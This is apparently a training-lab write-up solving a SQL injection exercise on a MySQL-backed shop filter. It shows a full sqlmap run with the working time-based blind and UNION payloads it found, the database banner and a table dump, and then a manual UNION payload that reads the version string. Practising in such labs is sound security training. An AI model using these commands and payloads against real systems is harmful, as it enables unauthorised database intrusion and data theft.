## Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

Description:

-  This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

- To solve the lab, display the database version string. 

```
┌──(kali㉿kali)-[~]
└─$ sudo sqlmap -u 'https://0ada002103c6ad5880ba622000b7006c.web-security-academy.net/filter?category=*' --batch --random-agent --dbms=mysql --banner --dump
        ___
       __H__                                                                                                                                                                                                                                
 ___ ___[(]_____ ___ ___  {1.10.8#stable}                                                                                                                                                                                                   
|_ -| . ["]     | .'| . |                                                                                                                                                                                                                   
|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:43:48 /2026-08-31/

[03:43:49] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
[03:43:49] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly
[03:43:49] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('session=bC4fioNBMyW...CfwNIAis4C'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* (URI)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: https://0ada002103c6ad5880ba622000b7006c.web-security-academy.net/filter?category=' AND (SELECT 2251 FROM (SELECT(!SLEEP(5)))jtnq) AND 'WFsO'='WFsO

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: https://0ada002103c6ad5880ba622000b7006c.web-security-academy.net/filter?category=' UNION ALL SELECT CONCAT(0x71766a7871,0x544b73785167526c635a4f4458566c446b516d566361454d566444526c676c685659746e684c506e,0x716b6b6271),NULL-- -
---
[03:43:49] [INFO] testing MySQL
[03:43:49] [INFO] confirming MySQL
[03:43:51] [INFO] the back-end DBMS is MySQL
[03:43:51] [INFO] fetching banner
back-end DBMS operating system: Linux Ubuntu 20.04 (focal)
back-end DBMS: MySQL >= 8.0.0
banner: '8.0.42-0ubuntu0.20.04.1'
[03:43:51] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[03:43:51] [INFO] fetching current database
[03:43:51] [INFO] fetching tables for database: 'academy_labs'
[03:43:51] [WARNING] reflective value(s) found and filtering out
[03:43:51] [INFO] fetching columns for table 'products' in database 'academy_labs'
[03:43:52] [INFO] fetching entries for table 'products' in database 'academy_labs'
Database: academy_labs
Table: products
[20 entries]
```

Manual Payload:

```
'+UNION+SELECT+@@version,+NULL#
```